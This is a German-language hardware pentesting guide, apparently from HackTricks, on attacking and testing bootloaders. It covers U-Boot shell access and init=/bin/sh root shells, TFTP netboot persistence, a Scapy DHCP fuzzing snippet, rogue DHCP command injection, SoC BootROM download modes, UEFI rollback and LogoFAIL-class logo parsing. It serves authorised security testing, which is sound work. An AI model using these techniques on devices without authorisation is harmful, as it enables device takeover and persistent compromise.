# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Geräte-Startkonfigurationen zu ändern und Bootloader wie U-Boot und UEFI-Klassen-Loader zu testen. Konzentriere dich darauf, frühe Code-Ausführung zu erreichen, Signatur-/Rollback-Schutz zu beurteilen und Wiederherstellungs- oder Netzwerk-Boot-Pfade auszunutzen.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: schnelle Erfolge und Environment-Missbrauch

1. Auf die Interpreter-Shell zugreifen
- Während des Boots eine bekannte Break-Taste drücken (oft jede Taste, 0, Space oder eine board-spezifische "magic"-Sequenz) bevor `bootcmd` ausgeführt wird, um an die U-Boot-Eingabeaufforderung zu gelangen.

2. Boot-Zustand und Variablen inspizieren
- Nützliche Befehle:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Boot-Argumente ändern, um eine Root-Shell zu bekommen
- Hänge `init=/bin/sh` an, damit der Kernel statt des normalen init eine Shell startet:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot von deinem TFTP-Server
- Netzwerk konfigurieren und ein Kernel/FIT-Image vom LAN holen:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Änderungen über die Environment persistent machen
- Wenn der env-Speicher nicht schreibgeschützt ist, kannst du Kontrolle persistent machen:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Abbrüche in die Shell ermöglichen.

6. Debug-/unsichere Funktionen prüfen
- Achte auf: `bootdelay` > 0, `autoboot` deaktiviert, uneingeschränktes `usb start; fatload usb 0:1 ...`, Möglichkeit zu `loady`/`loads` über Serial, `env import` von nicht vertrauenswürdigen Medien, und Kernel/Ramdisks, die ohne Signaturprüfungen geladen werden.

7. U-Boot Image-/Verifikations-Tests
- Wenn die Plattform Secure/Verified Boot mit FIT-Images behauptet, teste sowohl unsigned als auch manipulierte Images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder das alte `verify=n`-Verhalten erlaubt oft das Booten beliebiger Payloads.

## Netzwerk-Boot-Oberfläche (DHCP/PXE) und bösartige Server

8. PXE/DHCP-Parameter-Fuzzing
- U-Boots legacy BOOTP/DHCP-Handling hatte Memory-Safety-Probleme. Zum Beispiel beschreibt CVE‑2024‑42040 eine Memory-Disclosure über manipulierte DHCP-Antworten, die Bytes aus dem U-Boot-Speicher auf das Netz zurückleaken können. Teste die DHCP/PXE-Codepfade mit überlangen/Edge-Case-Werten (Option 67 bootfile-name, vendor options, file/servername-Felder) und beobachte auf Hänger und leak.
- Minimaler Scapy-Snippet, um Boot-Parameter beim Netboot zu stressen:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Prüfe außerdem, ob PXE-Filename-Felder an Shell/Loader-Logik ohne Sanitization weitergegeben werden, wenn sie zu OS-seitigen Provisioning-Skripten weitergereicht werden.

9. Testen von Kommando-Injektionen durch bösartige DHCP-Server
- Richte einen bösartigen DHCP/PXE-Dienst ein und versuche, Zeichen in Filename- oder Options-Felder zu injizieren, um Kommando-Interpreter in späteren Stufen der Boot-Kette zu erreichen. Metasploit’s DHCP auxiliary, `dnsmasq` oder eigene Scapy-Skripts eignen sich gut. Sorge dafür, dass du zuerst das Labornetz isolierst.

## SoC-ROM-Recovery-Modi, die den normalen Boot überschreiben

Viele SoCs bieten einen BootROM-"Loader"-Modus, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn Secure-Boot-Fuses/OTP nicht gebrannt sind, kann dies sehr früh in der Kette beliebige Code-Ausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Beispiel: `imx-usb-loader u-boot.imx` um ein custom U-Boot in RAM zu pushen und auszuführen.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` um einen Loader zu stageden und ein custom U-Boot hochzuladen.

Beurteile, ob das Gerät Secure-Boot eFuses/OTP gebrannt hat. Wenn nicht, umgehen BootROM-Download-Modi häufig jede höherstufige Verifikation (U-Boot, kernel, rootfs), indem dein First-Stage-Payload direkt aus SRAM/DRAM ausgeführt wird.

## UEFI/PC-Klassen-Bootloader: schnelle Prüfungen

10. ESP-Manipulation und Rollback-Tests
- Hänge die EFI System Partition (ESP) ein und überprüfe auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Versuche, mit herabgestuften oder bekannten verwundbaren signed Boot-Komponenten zu booten, wenn Secure Boot-Revocations (dbx) nicht aktuell sind. Wenn die Plattform alte shims/bootmanagers weiterhin vertraut, kannst du oft deinen eigenen Kernel oder `grub.cfg` von der ESP laden, um Persistenz zu erlangen.

11. Boot-Logo-Parsing-Bugs (LogoFAIL-Klasse)
- Mehrere OEM/IBV-Firmwares waren verwundbar gegenüber Image-Parsing-Fehlern in DXE, die Boot-Logos verarbeiten. Wenn ein Angreifer ein manipuliertes Image auf die ESP unter einem vendor-spezifischen Pfad legen kann (z.B. `\EFI\<vendor>\logo\*.bmp`) und neu bootet, kann Code-Ausführung während des frühen Boots möglich sein, selbst wenn Secure Boot aktiviert ist. Teste, ob die Plattform nutzergelieferte Logos akzeptiert und ob diese Pfade vom OS beschreibbar sind.

## Hardware-Vorsicht

Sei vorsichtig beim Umgang mit SPI/NAND-Flash während des frühen Boots (z.B. Pins erden, um Reads zu umgehen) und konsultiere stets das Flash-Datenblatt. Fehlzeitig gesetzte Kurzschlüsse können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- Probiere `env export -t ${loadaddr}` und `env import -t ${loadaddr}` um Environment-Blobs zwischen RAM und Storage zu verschieben; einige Plattformen erlauben das Importieren von env von entfernbaren Medien ohne Authentifizierung.
- Für Persistenz auf Linux-basierten Systemen, die via `extlinux.conf` booten, reicht es oft, die `APPEND`-Zeile (um `init=/bin/sh` oder `rd.break` zu injizieren) auf der Boot-Partition zu modifizieren, wenn keine Signaturprüfungen erzwungen werden.
- Wenn Userland `fw_printenv/fw_setenv` bereitstellt, validiere, dass `/etc/fw_env.config` mit dem echten env-Speicher übereinstimmt. Fehlkonfigurierte Offsets erlauben das Lesen/Schreiben der falschen MTD-Region.

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
